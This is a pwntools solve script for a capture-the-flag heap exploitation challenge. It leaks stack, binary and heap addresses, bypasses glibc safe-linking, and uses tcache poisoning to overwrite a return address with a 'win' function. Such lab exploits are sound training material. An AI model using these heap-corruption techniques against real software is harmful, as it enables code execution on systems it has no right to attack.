import pwn
from dojotool import tee, find_challenge


def one_round(io: pwn.process):
    tee(io)

    # how to exploit padding and flat_bufsize?? let's hardcode the offset for now
    offset = 0
    if 'easy' in str(io.executable):
        offset = 0x170
    if 'hard' in str(io.executable):
        offset = 0x110
    pwn.info(f"offset: {hex(offset)}")

    io.recvuntil(b"at: ")
    addrof_local_stack = int(io.recvuntil(b".", drop=True), 16)
    addrof_rbp = addrof_local_stack + offset
    io.recvuntil(b"at: ")
    addrof_main = int(io.recvuntil(b".", drop=True), 16)

    elf = io.elf
    elf.address = addrof_main - elf.symbols["main"]
    addrof_win = elf.symbols["win"]

    def protect_ptr(pos: int, ptr: int) -> int:
        return (pos >> 12) ^ ptr

    io.sendline(b"malloc 0 16")
    io.sendline(b"free 0")
    io.sendline(b"puts 0")
    io.recvuntil(b"Data: ")
    heap = pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8]) << 12  # page aligned

    pwn.info(f"addrof_heap: {hex(heap)}")
    pwn.info(f"addrof_rbp:  {hex(addrof_rbp)}")
    pwn.info(f"addrof_win:  {hex(addrof_win)}")
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 0")
    io.sendline(b"free 1")

    io.sendline(b"scanf 1")
    io.sendline(pwn.p64(protect_ptr(heap, addrof_local_stack)))
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")  # slot 1 points to address of slot 0

    io.sendline(b"scanf 1")  # overwrite slot 0's content to point to rbp+0x8
    io.sendline(pwn.p64(addrof_rbp + 0x8))

    io.sendline(b"scanf 0")  # overwrite rbp+0x8 with addrof_win
    io.sendline(pwn.p64(addrof_win))
    io.sendline(b"quit")


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(1)
            print()
            raise


if __name__ == "__main__":
    ctf()
